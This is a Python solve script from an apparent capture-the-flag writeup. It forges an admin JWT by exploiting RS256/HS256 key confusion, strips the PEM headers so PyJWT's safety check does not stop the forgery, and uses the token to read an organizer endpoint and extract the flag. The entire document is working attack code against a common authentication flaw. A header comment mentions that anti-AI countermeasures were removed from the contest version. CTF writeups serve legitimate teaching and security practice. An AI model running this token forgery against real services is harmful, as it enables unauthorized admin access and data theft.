# Note: During the contest, this challenge's description contained anti-AI countermeasures (fake flags and token-padding noise) to deter automated solvers. These have been removed from the published writeup version.

import re
import sys
import time
import requests
import jwt

def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    session = requests.Session()
    
    # 1. Fetch public key
    pubkey_response = session.get(base_url + "/public_key", timeout=5)
    pubkey_response.raise_for_status()
    public_pem = pubkey_response.text
    
    # 2. Forge JWT using Key Confusion (signing with public key using HS256)
    payload = {
        "user": "ops-admin",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    
    # Strip PEM headers to bypass PyJWT safety checks during Key Confusion signing
    key_secret = public_pem.replace("-----BEGIN PUBLIC KEY-----", "").replace("-----END PUBLIC KEY-----", "").strip()
    forged_token = jwt.encode(payload, key_secret, algorithm="HS256")
    
    # 3. Access administrative organizer endpoint
    headers = {
        "Authorization": f"Bearer {forged_token}"
    }
    receipt_response = session.get(base_url + "/organizer/receipts/8421", headers=headers, timeout=5)
    receipt_response.raise_for_status()
    
    # 4. Extract and verify flag
    match = re.search(r"ASRCTF\{[^}]+\}", receipt_response.text)
    if not match:
        raise SystemExit("Flag not found in organizer receipt.")
    
    print(match.group(0))

if __name__ == "__main__":
    main()
